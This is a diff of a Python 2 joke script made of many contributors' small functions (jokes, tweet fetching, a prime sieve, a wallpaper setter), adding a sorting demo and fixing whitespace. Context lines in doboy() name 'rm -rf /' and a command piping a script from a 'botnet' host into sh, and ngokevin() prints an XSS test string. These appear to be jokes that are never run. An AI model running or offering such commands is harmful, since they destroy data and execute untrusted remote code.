@@ -27,9 +27,16 @@ import webbrowser
 import time
 import urllib2
 import platform
+from operator import itemgetter
+
+def kirangangadharan():
+    a = [('Ant', 1), ('Elephant', 2), ('Cow', 3), ('Deer', 4)]
+    print "List sorted according to animal name: ", sorted(a, key=itemgetter(0,1))
+    print "List sorted according to number: ", sorted(a, key=itemgetter(1,0))
 
 def starefossen():
     print requests.get('http://kdd2.1337fire.com/').content
+
 
 def jontonsoup():
     print "There's always one more bug."
@@ -57,11 +64,11 @@ def doctorpangloss():
     # not sure what is being achieved here - @sricola
     #matches = re.sub(r'doctorpangloss\(\)\n', r'doctorpangloss()\ndoctorpangloss()\n', raw, re.M|re.I|re.G)
     #print raw
-    
+
 def ankushsachdeva():
 	contents =open(__file__).read()
 	print re.findall('def .* :',contents)
-	
+
 def adelevie():
     pass
 
@@ -78,7 +85,7 @@ def sricola():
 def bencooling():
     print "I don't know Python; I don't belong here"
     zachlatta()
-    
+
 def kisom():
     def zgohr(city):
         weather = json.loads(requests.
@@ -103,7 +110,7 @@ def evinugur():
 def ncammarata():
     tweets = json.loads(requests.get("https://search.twitter.com/search.json?q=a").content)
     tweet = tweets['results'][0]['text']
-    print "Random Tweet:", tweet.encode('utf-8') 
+    print "Random Tweet:", tweet.encode('utf-8')
 
 # Generate a random nonsense word with a vowel:consolant ratio of 1:5
 def taylorlapeyre():
@@ -123,7 +130,7 @@ def taylorlapeyre():
 
 def kghose():
     import curses, time
-    
+
     def main_loop(window):
         window.clear()
         N = 100
@@ -137,15 +144,15 @@ def kghose():
             for n in xrange(2*this_prime, N+1, this_prime):
                 numbers[n] = None
                 paint_grid(window, numbers)
-          
+
             keep_finding = False
             for n in xrange(this_prime+1, N+1):
                 if numbers[n] is not None:
                     this_prime = n
                     keep_finding = True
                     break
-    
-    
+
+
     def paint_grid(window, numbers):
         for row in xrange(10):
             for col in xrange(10):
@@ -157,9 +164,9 @@ def kghose():
               window.addstr(row, 3*col, s)
         window.refresh()
         time.sleep(.1)
-    
+
     curses.wrapper(main_loop)
-    
+
 def jessex():
     os.execl("/bin/echo", "echo", "This is a long way to go for 'hello world' but life's about the journey.")
 
@@ -381,25 +388,25 @@ def chris911():
 
 def PiersonBro():
     print "My bane was not capability it was randomness."
- 
+
 def dogukantufekci():
     print "This is the connected world."
     webbrowser.open('http://www.silverspore.com/wiki/images/1/12/Connected_world-medium.jpg')
-    
+
 def doboy(doboy_):
     if doboy == doboy_:
         doboy_('rm -rf /')
         doboy('sh <(curl botnet.beepboop.com/main.sh)')
     else:
         print doboy_
-        
+
 def ngokevin(shamelessadvertising):
     # I'm sleepy zzz.
     time.sleep(0)
     # Check for XSS.
     print '<script>alert("HAHAHA");</script>'
     import antigravity
-    
+
 def gardaud(func):
 	print "Should I execute func?"
 	if random.randrange(0,2) == 0:
@@ -430,7 +437,7 @@ def lax():
 
 def shazeline(name):
     print name + " is a pretty cool guy"
-    
+
 def samlabs821():
     print "vesselam"
 
@@ -466,7 +473,7 @@ def dmercer(number, start=2):
         if is_prime:
             sieve.append(n)
     return sieve
-    
+
 def ryanseys():
     try:
         ryanseys()
@@ -507,7 +514,7 @@ def danielnr(huehue):
     print "               :o              `-/////+sy-                   -////-`   oy       "
     print "               y.                   `````                   /so+//:::/+d-       "
     print "              /s------------------------------------------------::///:/         "
-  
+
 def spratt():
     print "Simon was here"
 
@@ -518,20 +525,20 @@ def dpayne():
     try:
         #sets the desktop wallpaper to the top image on the wallpapers subreddit
         sub_reddit = 'wallpapers'
-        
+
         #get the top image link
         reddit_json_url = 'http://www.reddit.com/r/' + sub_reddit + '/top.json?sort=top&t=day'
         response = urllib2.urlopen(reddit_json_url)
         redditJson = response.read()
         m = re.search('\"url\": \"(.*?)\",', redditJson)
         imageUrl = m.group(1)
-        
+
         extension = imageUrl[-4:]
         accepted_extensions = set(['jpeg', '.jpg', '.png', '.bmp'])
         if extension not in accepted_extensions:
             #ignore non image extensions
             return False
-        
+
         #save top wallpaper
         opener1 = urllib2.build_opener()
         page1 = opener1.open(imageUrl)
@@ -540,10 +547,10 @@ def dpayne():
         fout = open(filename, "wb")
         fout.write(my_picture)
         fout.close()
-        
+
         currentDir = os.getcwd()
         plat = platform.system().lower()
-        
+
         #set wallpaper
         if (plat == 'darwin'):
             os.system("defaults write com.apple.desktop Background '{default = {ImageFilePath = \"" + currentDir + "/reddit_wallpaper.jpg\"; };}'")
@@ -551,9 +558,9 @@ def dpayne():
             return True
     except urllib2.HTTPError:
         print 'There was an error'
-    
+
     return False
-  
+
 if __name__ == "__main__":
     starefossen()
     heinzf(False) # this thing makes it hard to make sure stuff works, doesn't it?
@@ -611,6 +618,6 @@ if __name__ == "__main__":
     spratt()
     windspy()
     samlabs821()
-    
+
     # as per instructed, please leave this as the final function
     lafin()
